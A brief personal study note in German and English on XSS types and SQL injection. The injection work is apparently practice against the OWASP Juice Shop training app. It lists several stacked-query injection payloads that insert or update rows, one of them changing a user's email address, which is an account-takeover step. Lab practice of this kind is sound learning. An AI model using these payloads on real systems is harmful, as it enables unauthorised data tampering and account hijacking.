

# XSS (=Cross-site Scripting) Attacks
- Schadwer zu anderem End user schicken
- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)


## Type von XSS
1. Stored / Persistent / Type 1: jected script is permanently stored on the target servers
2. Reflected / Non-Persistent / Type-II XSS
(3. DOM BASED XSS)


# TODOs für die Seite
- Insert the specified JS code into the database

INSERT INTO Products VALUES (1, 2, 3);
' OR 1; INSERT INTO Products VALUES ('1', '2', '3'); #
' OR 1; UPDATE Products SET Name='1' WHERE Name='Apple Juice (1000ml)'; #
' OR 1; UPDATE Products SET Name='1' WHERE id=1; #
UPDATE table_name SET smth ='smth@email.addr' WHERE user = 'admin';



id=1
name="Quince Juice (1000ml)"
createdAt="2016-12-30 06:59:28.000 +00:00"
deletedAt=null
description="Juice of the <em>Cydonia oblonga</em> fruit. Not exactly sweet but rich in Vitamin C."
id=15
image="quince.jpg"
name="Quince Juice (1000ml)"
price=4.99
updatedAt="2016-12-30 06:59:28.000 +00:00"


## Funktioniert irgendwie aus irgendeinem grund auch nicht.......
' OR 1; UPDATE Users SET email='altered@altered.de' WHERE email='jim@juice-sh.op';#
